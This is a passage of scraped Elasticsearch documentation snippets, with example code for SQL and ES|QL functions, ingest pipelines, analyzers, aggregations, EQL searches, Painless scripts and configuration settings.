modulo 100 in 10-unit buckets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-grouping.md#2025-04-21_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nSELECT HISTOGRAM(salary % 100, 10) AS h, COUNT(*) AS c FROM emp GROUP BY h;\n\n       h       |       c\n---------------+---------------\n0              |10\n10             |15\n20             |10\n30             |14\n40             |9\n50             |9\n60             |8\n70             |13\n80             |3\n90             |9\n```\n\n----------------------------------------\n\nTITLE: Response from Indexing with Date Index Name Pipeline in Elasticsearch\nDESCRIPTION: The response shows that the document was indexed into 'my-index-2016-04-01' rather than 'my-index', demonstrating how the processor overrides the _index property based on date rounding.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/date-index-name-processor.md#2025-04-21_snippet_2\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"_index\" : \"my-index-2016-04-01\",\n  \"_id\" : \"1\",\n  \"_version\" : 1,\n  \"result\" : \"created\",\n  \"_shards\" : {\n    \"total\" : 2,\n    \"successful\" : 1,\n    \"failed\" : 0\n  },\n  \"_seq_no\" : 55,\n  \"_primary_term\" : 1\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Child (Answer) Documents in Elasticsearch\nDESCRIPTION: These snippets demonstrate how to index child documents (answers) with a reference to their parent question and additional metadata.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-children-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT child_example/_doc/2?routing=1\n{\n  \"join\": {\n    \"name\": \"answer\",\n    \"parent\": \"1\"\n  },\n  \"owner\": {\n    \"location\": \"Norfolk, United Kingdom\",\n    \"display_name\": \"Sam\",\n    \"id\": 48\n  },\n  \"body\": \"<p>Unfortunately you're pretty much limited to FTP...\",\n  \"creation_date\": \"2009-05-04T13:45:37.030\"\n}\n\nPUT child_example/_doc/3?routing=1&refresh\n{\n  \"join\": {\n    \"name\": \"answer\",\n    \"parent\": \"1\"\n  },\n  \"owner\": {\n    \"location\": \"Norfolk, United Kingdom\",\n    \"display_name\": \"Troll\",\n    \"id\": 49\n  },\n  \"body\": \"<p>Use Linux...\",\n  \"creation_date\": \"2009-05-05T13:45:37.030\"\n}\n```\n\n----------------------------------------\n\nTITLE: ENRICH with Specific Fields\nDESCRIPTION: Example showing ENRICH usage with explicit field selection using the WITH clause.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/enrich.md#2025-04-21_snippet_3\n\nLANGUAGE: esql\nCODE:\n```\nFROM languages.csv | ENRICH languages_policy WITH language_name\n```\n\n----------------------------------------\n\nTITLE: Required Zoom API Scopes for Connector Configuration\nDESCRIPTION: List of required granular scopes that need to be added to the Zoom Server-to-Server OAuth application to enable proper connector functionality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-zoom.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nuser:read:list_users:admin\nmeeting:read:list_meetings:admin\nmeeting:read:list_past_participants:admin\ncloud_recording:read:list_user_recordings:admin\nteam_chat:read:list_user_channels:admin\nteam_chat:read:list_user_messages:admin\n```\n\n----------------------------------------\n\nTITLE: Describing STRING_AGG Function in Elasticsearch ESQL\nDESCRIPTION: The STRING_AGG function in Elasticsearch ESQL converts a multivalued string expression into a single valued column. It concatenates all values, separating them with a specified delimiter. This function is useful for aggregating multiple string values into a single, comma-separated (or otherwise delimited) string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/mv_concat.md#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nConverts a multivalued string expression into a single valued column containing the concatenation of all values separated by a delimiter.\n```\n\n----------------------------------------\n\nTITLE: Running Asynchronous EQL Search in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to run an asynchronous EQL search by setting the wait_for_completion_timeout parameter, which is useful for searches across large data sets or frozen data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_23\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search\n{\n  \"wait_for_completion_timeout\": \"2s\",\n  \"query\": \"\"\"\n    process where process.name == \"cmd.exe\"\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Nested Documents with Inner Hits in Elasticsearch\nDESCRIPTION: Shows how to query nested documents and retrieve inner hits in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-inner-hits.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST test/_search\n{\n  \"query\": {\n    \"nested\": {\n      \"path\": \"comments\",\n      \"query\": {\n        \"match\": {\"comments.number\" : 2}\n      },\n      \"inner_hits\": {} <1>\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Query String Search Request\nDESCRIPTION: This code snippet demonstrates a basic search request using the `query_string` query in Elasticsearch. It searches the `content` field for documents matching the query `(new york city) OR (big apple)`. The query string is split into two parts and analyzed independently.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"query_string\": {\n      \"query\": \"(new york city) OR (big apple)\",\n      \"default_field\": \"content\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an attachment pipeline and indexing a document\nDESCRIPTION: Example showing how to create an attachment processor pipeline and index a document with base64-encoded data, then retrieve the processed document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/attachment.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT _ingest/pipeline/attachment\n{\n  \"description\" : \"Extract attachment information\",\n  \"processors\" : [\n    {\n      \"attachment\" : {\n        \"field\" : \"data\",\n        \"remove_binary\": true\n      }\n    }\n  ]\n}\nPUT my-index-000001/_doc/my_id?pipeline=attachment\n{\n  \"data\": \"e1xydGYxXGFuc2kNCkxvcmVtIGlwc3VtIGRvbG9yIHNpdCBhbWV0DQpccGFyIH0=\"\n}\nGET my-index-000001/_doc/my_id\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Analyzer with Synonym Filter in Elasticsearch\nDESCRIPTION: Example of including a synonym token filter in a custom analyzer configuration. The analyzer uses the standard tokenizer and applies stemmer and synonym filters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-synonym-tokenfilter.md#2025-04-21_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"type\": \"custom\",\n          \"tokenizer\": \"standard\",\n          \"filter\": [\"stemmer\", \"synonym\"]\n        }\n      }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Multiple Transport Profiles in Elasticsearch\nDESCRIPTION: Example configuration showing how to set up multiple transport profiles in Elasticsearch. Demonstrates binding to different ports and interfaces for default, client, and DMZ profiles.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\ntransport.profiles.default.port: 9300-9400\ntransport.profiles.default.bind_host: 10.0.0.1\ntransport.profiles.client.port: 9500-9600\ntransport.profiles.client.bind_host: 192.168.0.1\ntransport.profiles.dmz.port: 9700-9800\ntransport.profiles.dmz.bind_host: 172.16.1.2\n```\n\n----------------------------------------\n\nTITLE: Setting decompound_mode to 'none' in Nori Tokenizer\nDESCRIPTION: Example output when decompound_mode is set to 'none', which doesn't decompose compound tokens but keeps them as is.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-nori-tokenizer.md#2025-04-21_snippet_0\n\nLANGUAGE: txt\nCODE:\n```\n가거도항\n가곡역\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with Unique Token Filter in Elasticsearch\nDESCRIPTION: This example shows how to use the create index API to configure a new custom analyzer that incorporates the unique filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-unique-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT custom_unique_example\n{\n  \"settings\" : {\n    \"analysis\" : {\n      \"analyzer\" : {\n        \"standard_truncate\" : {\n        \"tokenizer\" : \"standard\",\n        \"filter\" : [\"unique\"]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ENRICH with Field Renaming\nDESCRIPTION: Example demonstrating ENRICH usage with field renaming capabilities using the WITH clause.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/enrich.md#2025-04-21_snippet_4\n\nLANGUAGE: esql\nCODE:\n```\nFROM languages.csv | ENRICH languages_policy WITH name=language_name\n```\n\n----------------------------------------\n\nTITLE: Extracting Date Field Values with Painless\nDESCRIPTION: Uses Painless to extract the birth year from a date field for all hockey players using the script_fields feature.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/brief-painless-walkthrough.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nGET hockey/_search\n{\n  \"script_fields\": {\n    \"birth_year\": {\n      \"script\": {\n        \"source\": \"doc.born.value.year\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Type Conversion Support Matrix\nDESCRIPTION: Detailed matrix showing how different field types (boolean, date, date_nanos, double, integer, ip, keyword, long, text, version) convert when used with different precision specifications (integer, long, unsigned_long). All combinations result in long type output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/count_distinct.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | precision | result |\n| --- | --- | --- |\n| boolean | integer | long |\n| boolean | long | long |\n| boolean | unsigned_long | long |\n| boolean | | long |\n| date | integer | long |\n| date | long | long |\n| date | unsigned_long | long |\n| date | | long |\n| date_nanos | integer | long |\n| date_nanos | long | long |\n| date_nanos | unsigned_long | long |\n| date_nanos | | long |\n| double | integer | long |\n| double | long | long |\n| double | unsigned_long | long |\n| double | | long |\n| integer | integer | long |\n| integer | long | long |\n| integer | unsigned_long | long |\n| integer | | long |\n| ip | integer | long |\n| ip | long | long |\n| ip | unsigned_long | long |\n| ip | | long |\n| keyword | integer | long |\n| keyword | long | long |\n| keyword | unsigned_long | long |\n| keyword | | long |\n| long | integer | long |\n| long | long | long |\n| long | unsigned_long | long |\n| long | | long |\n| text | integer | long |\n| text | long | long |\n| text | unsigned_long | long |\n| text | | long |\n| version | integer | long |\n| version | long | long |\n| version | unsigned_long | long |\n| version | | long |\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text Using Whitespace Analyzer in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the `whitespace` analyzer to analyze a given text input. The `POST _analyze` request analyzes the text by breaking it into terms whenever a whitespace character is encountered, producing an output of individual terms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-whitespace-analyzer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _analyze\n{\n  \"analyzer\": \"whitespace\",\n  \"text\": \"The 2 QUICK Brown-Foxes jumped over the lazy dog's bone.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Dissect Processor Configuration in Elasticsearch Pipeline\nDESCRIPTION: Configuration example for the dissect processor in an Elasticsearch ingest pipeline. The processor is configured to extract fields from the 'message' field using the specified pattern.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/dissect-processor.md#2025-04-21_snippet_3\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"dissect\": {\n    \"field\": \"message\",\n    \"pattern\" : \"%{clientip} %{ident} %{auth} [%{@timestamp}] \\\"%{verb} %{request} HTTP/%{httpversion}\\\" %{status} %{size}\"\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Logging put_user Event in Elasticsearch\nDESCRIPTION: Example of an audit log for the create or update user event. This event is logged when the API is invoked to create or update a native user, which can also include password changes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_15\n\nLANGUAGE: javascript\nCODE:\n```\n{\"type\":\"audit\", \"timestamp\":\"2020-12-30T22:10:09,749+0200\", \"node.id\":\n\"0RMNyghkQYCc_gVd1G6tZQ\", \"event.type\":\"security_config_change\",\n\"event.action\":\"put_user\", \"request.id\":\"VIiSvhp4Riim_tpkQCVSQA\",\n\"put\":{\"user\":{\"name\":\"user1\",\"enabled\":false,\"roles\":[\"admin\",\"other_role1\"],\n\"full_name\":\"Jack Sparrow\",\"email\":\"jack@blackpearl.com\",\n\"has_password\":true,\"metadata\":{\"cunning\":10}}}}\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with Edge N-gram Filter\nDESCRIPTION: Creates a new index with a custom analyzer that incorporates the edge_ngram filter using the standard tokenizer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-edgengram-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT edge_ngram_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"standard_edge_ngram\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"edge_ngram\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Pipeline Aggregation with Top Metrics\nDESCRIPTION: Demonstrates using top_metrics in pipeline aggregations with bucket_selector for filtering buckets based on metric values, similar to SQL HAVING clause.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-top-metrics.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nPOST /test*/_search?filter_path=aggregations\n{\n  \"aggs\": {\n    \"ip\": {\n      \"terms\": {\n        \"field\": \"ip\"\n      },\n      \"aggs\": {\n        \"tm\": {\n          \"top_metrics\": {\n            \"metrics\": {\"field\": \"m\"},\n            \"sort\": {\"s\": \"desc\"},\n            \"size\": 1\n          }\n        },\n        \"having_tm\": {\n          \"bucket_selector\": {\n            \"buckets_path\": {\n              \"top_m\": \"tm[m]\"\n            },\n            \"script\": \"params.top_m < 1000\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: HashMap Definition in Java\nDESCRIPTION: This snippet defines the HashMap class which implements the Map interface. It provides methods for creating hash-based key-value pairs, including store, retrieve, and clone operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_18\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.HashMap {\n  ()\n  (Map)\n  def clone()\n}\n```\n\n----------------------------------------\n\nTITLE: Using CURDATE Function in Elasticsearch SQL\nDESCRIPTION: Example showing the CURDATE() function, which is an alias for CURRENT_DATE().\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_10\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CURDATE() AS result;\n\n         result\n------------------------\n2018-12-12\n```\n\n----------------------------------------\n\nTITLE: Match Phrase Prefix Query Example\nDESCRIPTION: Demonstrates using a match_phrase_prefix query for strict term order matching. This query type is useful when exact phrase matching with a prefix is required.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/search-as-you-type.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"match_phrase_prefix\": {\n      \"my_field\": \"brown f\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Multiple Highlighting Tags with Fast Vector Highlighter\nDESCRIPTION: This snippet shows how to specify multiple tags with the fast vector highlighter. Multiple tags can be ordered by importance, allowing for different levels of highlighting within the search results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\" : {\n    \"match\": { \"user.id\": \"kimchy\" }\n  },\n  \"highlight\" : {\n    \"pre_tags\" : [\"<tag1>\", \"<tag2>\"],\n    \"post_tags\" : [\"</tag1>\", \"</tag2>\"],\n    \"fields\" : {\n      \"body\" : {}\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running Cross-Cluster EQL Search in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to run an EQL search across multiple clusters by targeting data streams on remote clusters using the '<cluster>:<target>' syntax.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_32\n\nLANGUAGE: console\nCODE:\n```\nGET /cluster_one:my-data-stream,cluster_two:my-data-stream/_eql/search\n{\n  \"query\": \"\"\"\n    process where process.name == \"regsvr32.exe\"\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Using WHERE Clause for Filtering\nDESCRIPTION: Example of using the WHERE clause to filter rows based on a condition, returning only rows where emp_no equals 10001.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_10\n\nLANGUAGE: sql\nCODE:\n```\nSELECT last_name FROM emp WHERE emp_no = 10001;\n```\n\n----------------------------------------\n\nTITLE: Configuring PKI Realm Settings in Elasticsearch\nDESCRIPTION: Configuration settings for PKI realm in Elasticsearch, including username pattern matching, certificate authorities, truststore configuration, role mapping, caching, and delegation options. These settings control how PKI-based authentication works within Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\nusername_pattern: \"CN=(.*?)(?:,|$)\"  # Default pattern for extracting username from certificate DN\ncertificate_authorities: [\"path/to/cert.pem\"]  # PEM certificate paths for authentication\ntruststore.algorithm: \"SunX509\"  # Default truststore algorithm\ntruststore.password: \"password\"  # Password for truststore (deprecated in 7.17.0)\ntruststore.secure_password: \"secure_password\"  # Secure password for truststore\ntruststore.path: \"/path/to/truststore\"  # Path to truststore\nfiles.role_mapping: \"ES_PATH_CONF/role_mapping.yml\"  # Path to role mapping configuration\nauthorization_realms: [\"realm1\", \"realm2\"]  # Realms for delegated authorization\ncache.ttl: \"20m\"  # Cache time-to-live for user entries\ncache.max_users: 100000  # Maximum cached user entries\ndelegation.enabled: false  # Enable/disable proxy delegation support\n```\n\n----------------------------------------\n\nTITLE: ESQL Median Function Parameter Documentation\nDESCRIPTION: Documentation for the 'number' parameter used in an ESQL median calculation function. The parameter accepts expressions that output values for median calculation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/median.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`number`\n:   Expression that outputs values to calculate the median of.\n```\n\n----------------------------------------\n\nTITLE: Converting Vowels to Uppercase with Function-based Replacement in Painless\nDESCRIPTION: Uses functional replacement in Painless to convert all vowels in player last names to uppercase.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/brief-painless-walkthrough.md#2025-04-21_snippet_13\n\nLANGUAGE: console\nCODE:\n```\nPOST hockey/_update_by_query\n{\n  \"script\": {\n    \"lang\": \"painless\",\n    \"source\": \"\"\"\n      ctx._source.last = ctx._source.last.replaceAll(/[aeiou]/, m ->\n        m.group().toUpperCase(Locale.ROOT))\n    \"\"\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: JSON Operations Class Definition\nDESCRIPTION: Defines JSON parsing and serialization methods for handling JSON data in scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.ingest.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.painless.api.Json {\n  def load(String)\n  String dump(def)\n  String dump(def, boolean)\n}\n```\n\n----------------------------------------\n\nTITLE: Pivot with Explicit Value List\nDESCRIPTION: Example of a supported PIVOT query that explicitly lists the values to pivot on rather than using a subquery.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-limitations.md#2025-04-21_snippet_11\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM test_emp PIVOT (SUM(salary) FOR languages IN (1, 2))\n```\n\n----------------------------------------\n\nTITLE: List Initialization Grammar Definition in Painless\nDESCRIPTION: Grammar specification for list initialization operator in Painless scripting language.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_6\n\nLANGUAGE: text\nCODE:\n```\nlist_initialization: '[' expression (',' expression)* ']'\n                   | '[' ']';\n```\n\n----------------------------------------\n\nTITLE: Uploading Hugging Face Model to Elasticsearch\nDESCRIPTION: Shell command to upload a Hugging Face model to Elasticsearch using Eland, requiring Cloud ID and API key authentication\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrievers.md#2025-04-21_snippet_9\n\nLANGUAGE: sh\nCODE:\n```\neland_import_hub_model \\\n  --cloud-id $CLOUD_ID \\\n  --es-api-key $ES_API_KEY \\\n  --hub-model-id cross-encoder/ms-marco-MiniLM-L-6-v2 \\\n  --task-type text_similarity \\\n  --clear-previous \\\n  --start\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom DFR Similarity Settings in Elasticsearch\nDESCRIPTION: Example showing how to create an index with custom DFR similarity settings. The configuration includes basic model, after effect, and normalization parameters that can be referenced later in field mappings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/similarity.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /index\n{\n  \"settings\": {\n    \"index\": {\n      \"similarity\": {\n        \"my_similarity\": {\n          \"type\": \"DFR\",\n          \"basic_model\": \"g\",\n          \"after_effect\": \"l\",\n          \"normalization\": \"h2\",\n          \"normalization.h2.c\": \"3.0\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Custom Config Directory with Elasticsearch Plugin Script\nDESCRIPTION: Shows how to specify a custom location for the elasticsearch.yml configuration file when using the plugin script by setting the ES_PATH_CONF environment variable.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/_other_command_line_parameters.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nsudo ES_PATH_CONF=/path/to/conf/dir bin/elasticsearch-plugin install <plugin name>\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with Predicate Token Filter in Elasticsearch\nDESCRIPTION: This example shows how to create a custom analyzer using a customized predicate_token_filter in Elasticsearch. The custom filter removes tokens that are not of type ALPHANUM.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-predicatefilter-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [\n            \"my_script_filter\"\n          ]\n        }\n      },\n      \"filter\": {\n        \"my_script_filter\": {\n          \"type\": \"predicate_token_filter\",\n          \"script\": {\n            \"source\": \"\"\"\n              token.type.contains(\"ALPHANUM\")\n            \"\"\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Coercion for Integer Fields in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to configure coercion for integer fields in an Elasticsearch index mapping. It shows one field with default coercion and another with coercion explicitly disabled.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/coerce.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"number_one\": {\n        \"type\": \"integer\"\n      },\n      \"number_two\": {\n        \"type\": \"integer\",\n        \"coerce\": false\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{\n  \"number_one\": \"10\"\n}\n\nPUT my-index-000001/_doc/2\n{\n  \"number_two\": \"10\"\n}\n```\n\n----------------------------------------\n\nTITLE: Parsing Source Document Datetime in Painless\nDESCRIPTION: This snippet explains how to convert datetime information from a source document into ZonedDateTime objects in Painless. It includes parsing both numeric and string datetimes while highlighting dependencies on context.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_18\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  ...\n  \"input_datetime\": 434931327000\n  ...\n}\n```\n\nLANGUAGE: painless\nCODE:\n```\nlong inputDateTime = ctx['_source']['input_datetime']; <1>\nInstant instant = Instant.ofEpochMilli(inputDateTime);\nZonedDateTime zdt = ZonedDateTime.ofInstant(instant, ZoneId.of('Z'));\n```\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  ...\n  \"input_datetime\": \"1983-10-13T22:15:30Z\"\n  ...\n}\n```\n\nLANGUAGE: painless\nCODE:\n```\nString datetime = params['_source']['input_datetime']; <1>\nZonedDateTime zdt = ZonedDateTime.parse(datetime); <2>\n```\n\n----------------------------------------\n\nTITLE: Adjacency Matrix Aggregation Response Structure in Elasticsearch\nDESCRIPTION: This snippet shows the response structure from an adjacency_matrix aggregation. It returns buckets with document counts for each filter and combination of filters, excluding buckets with no matching documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-adjacency-matrix-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n{\n  \"took\": 9,\n  \"timed_out\": false,\n  \"_shards\": ...,\n  \"hits\": ...,\n  \"aggregations\": {\n    \"interactions\": {\n      \"buckets\": [\n        {\n          \"key\":\"grpA\",\n          \"doc_count\": 2\n        },\n        {\n          \"key\":\"grpA&grpB\",\n          \"doc_count\": 1\n        },\n        {\n          \"key\":\"grpB\",\n          \"doc_count\": 2\n        },\n        {\n          \"key\":\"grpB&grpC\",\n          \"doc_count\": 1\n        },\n        {\n          \"key\":\"grpC\",\n          \"doc_count\": 1\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Composite Aggregation with Sub-aggregation in Elasticsearch\nDESCRIPTION: This snippet shows how to use sub-aggregations within a composite aggregation. It computes the average price for each composite bucket created by date and product.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_22\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_buckets\": {\n      \"composite\": {\n        \"sources\": [\n          { \"date\": { \"date_histogram\": { \"field\": \"timestamp\", \"calendar_interval\": \"1d\", \"order\": \"desc\" } } },\n          { \"product\": { \"terms\": { \"field\": \"product\" } } }\n        ]\n      },\n      \"aggregations\": {\n        \"the_avg\": {\n          \"avg\": { \"field\": \"price\" }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running Notion Connector Docker Container\nDESCRIPTION: Command to run the Docker container for the Notion connector service. This command mounts the configuration directory, sets the network, and specifies the Docker image and command to run.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-notion.md#2025-04-21_snippet_3\n\nLANGUAGE: sh\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Decoding Base64 String Using FROM_BASE64 Function in ESQL\nDESCRIPTION: This snippet shows how to use the FROM_BASE64 function in ESQL to decode a Base64 encoded string. It creates a row with a Base64 encoded value and then decodes it using the FROM_BASE64 function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/from_base64.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"ZWxhc3RpYw==\"\n| EVAL d = FROM_BASE64(a)\n```\n\n----------------------------------------\n\nTITLE: Vector Index Creation and Document Indexing\nDESCRIPTION: Shows how to create an index with dense vector mapping and index sample documents with vector values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-script-score-query.md#2025-04-21_snippet_11\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_dense_vector\": {\n        \"type\": \"dense_vector\",\n        \"index\": false,\n        \"dims\": 3\n      },\n      \"my_byte_dense_vector\": {\n        \"type\": \"dense_vector\",\n        \"index\": false,\n        \"dims\": 3,\n        \"element_type\": \"byte\"\n      },\n      